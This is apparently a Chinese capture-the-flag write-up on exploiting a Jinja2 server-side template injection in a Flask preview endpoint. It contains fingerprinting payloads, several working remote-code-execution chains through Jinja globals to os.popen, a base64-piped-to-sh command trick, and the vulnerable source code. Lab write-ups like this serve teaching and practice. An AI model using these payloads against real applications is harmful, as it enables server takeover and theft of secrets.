## 2. 指纹确认（Jinja2 而非 Twig）

| payload | 结果 | 说明 |
|---|---|---|
| `{{7*7}}` | `49` | 模板被求值 |
| `{{7*'7'}}` | `7777777` | **字符串也能乘 ⇒ Jinja2**（Twig 会报错/得 49） |
| `{{config}}` | 完整 Flask Config | 确认是 Flask `render_template_string`，`SECRET_KEY=render-preview-dev-key` |

## 3. 利用（无 WAF，一次打通）

```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
→ uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
```

`cycler` 是 Jinja2 内置全局可调用对象，`cycler.__init__` 是 Python 函数，
其 `__globals__` 就是 `jinja2.utils` 的全局命名空间，而该模块 `import os`，
于是直接拿到 `os.popen`。

等价的可用链（都已实测成功）：

```
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

## 4. 根因（RCE 读回的源码）

`/app/src/app.py`：

```python
@app.route("/render", methods=["POST"])
def render_preview():
    template_input = request.form.get("template", "")[:4000]
    ...
    rendered = render_template_string(          # ← SSTI sink
        template_input, profile=PROFILE, helpers=HELPERS, motd=MOTD,
    )
```

用户输入被**当成模板源码渲染**，而不是当成模板变量插入 ⇒ 任意模板表达式求值 ⇒ RCE。

## 5. 取 flag

```
$ printenv FLAG
0xGame{65ea3733-b722-4077-83d1-d5ea5703a535}
```

`/flag` 存在但 `-r-------- root root`，`ctf` 用户 `cat` 报 Permission denied；
`/entrypoint.sh` 证实 `printf '%s\n' "$FLAG" > /flag` —— env 与文件同值，
所以 env 就是权威 flag。45 字节 = flag 44 字符 + 换行，吻合。

## 8. 学到的点

- **先指纹再打**：`{{7*'7'}}` 这一步把 Jinja2 和 Twig 分开了，省掉一堆无效 payload。
- **命令里带引号会毁掉模板**：`find -name '*.py'` 会截断 Jinja 字符串字面量。
  解法是把命令 base64 后再 `echo <b64> | base64 -d | sh`，见 `scripts/2-solve.py` 的 `rce()`。
- **靶机读不到文件不代表拿不到 flag**：`/flag` 是 0400 root，但动态 flag 一定在
  `entrypoint.sh` 注入的 env 里 —— `printenv` / `env` 优先于 `cat /flag`。
